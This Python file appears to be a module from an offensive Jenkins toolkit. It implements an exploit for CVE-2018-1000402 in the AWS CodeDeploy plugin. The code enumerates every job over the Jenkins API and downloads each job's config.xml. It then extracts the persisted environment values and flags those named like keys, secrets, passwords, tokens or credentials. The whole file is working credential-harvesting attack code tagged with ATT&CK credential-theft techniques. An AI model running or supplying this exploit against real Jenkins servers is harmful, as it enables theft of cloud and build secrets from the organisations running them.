"""
CVE-2018-1000402: AWS CodeDeploy Plugin Environment Variable Exposure

The AWS CodeDeploy Plugin persisted environment variables from the last run in config.xml,
allowing users with file system access or Extended Read permission to obtain potentially
sensitive environment variables.
"""

import xml.etree.ElementTree as ET
from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2018_1000402(ExploitModule):
    """AWS CodeDeploy Plugin environment variable exposure in job config.xml."""

    CVE_ID = "CVE-2018-1000402"

    METADATA = ExploitMetadata(
        cve_id="CVE-2018-1000402",
        name="AWS CodeDeploy Plugin Environment Variable Exposure",
        description="Exposure of sensitive environment variables persisted in job config.xml",
        affected_versions=["<= 1.19"],
        mitre_attack=["T1552.001", "T1078"],
        severity="medium",
        references=[
            "https://www.jenkins.io/security/advisory/2018-06-25/",
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1000402"
        ],
        requires_auth=True,
        requires_crumb=False,
        tags=["information-disclosure", "credentials", "config-file"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance has AWS CodeDeploy plugin installed.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/pluginManager/api/json?depth=1")

            if response.status_code == 200:
                data = response.json()
                for plugin in data.get('plugins', []):
                    if plugin.get('shortName') == 'codedeploy':
                        return True
            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2018-1000402 to extract environment variables from job configurations.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            ExploitResult: Result of the exploit
        """
        discovered_vars = {}
        jobs_checked = 0
        vulnerable_jobs = []

        try:
            response = session.get("/api/json?tree=jobs[name,url]")

            if response.status_code != 200:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Failed to enumerate jobs: HTTP {response.status_code}"
                )

            jobs = response.json().get('jobs', [])

            for job in jobs:
                job_name = job.get('name')
                job_url = job.get('url', '').rstrip('/')
                jobs_checked += 1

                config_url = f"{job_url}/config.xml"
                try:
                    config_response = session.get(config_url)

                    if config_response.status_code == 200:
                        xml_content = config_response.text

                        if 'com.amazonaws.codedeploy.AWSCodeDeployPublisher' in xml_content:
                            vulnerable_jobs.append(job_name)

                            try:
                                root = ET.fromstring(xml_content)

                                for publisher in root.iter('com.amazonaws.codedeploy.AWSCodeDeployPublisher'):
                                    env_vars = {}

                                    for child in publisher:
                                        if child.text and child.text.strip():
                                            env_vars[child.tag] = child.text.strip()

                                    if env_vars:
                                        discovered_vars[job_name] = env_vars

                            except ET.ParseError:
                                pass

                except Exception:
                    pass

            if discovered_vars:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"Extracted environment variables from {len(discovered_vars)} job(s)",
                    data={
                        "jobs_checked": jobs_checked,
                        "vulnerable_jobs": vulnerable_jobs,
                        "environment_variables": discovered_vars,
                        "sensitive_keys_found": sum(
                            1 for job_vars in discovered_vars.values()
                            for key in job_vars.keys()
                            if any(k in key.lower() for k in ['key', 'secret', 'password', 'token', 'credential'])
                        )
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="No AWS CodeDeploy configurations with environment variables found"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution error: {str(e)}"
            )
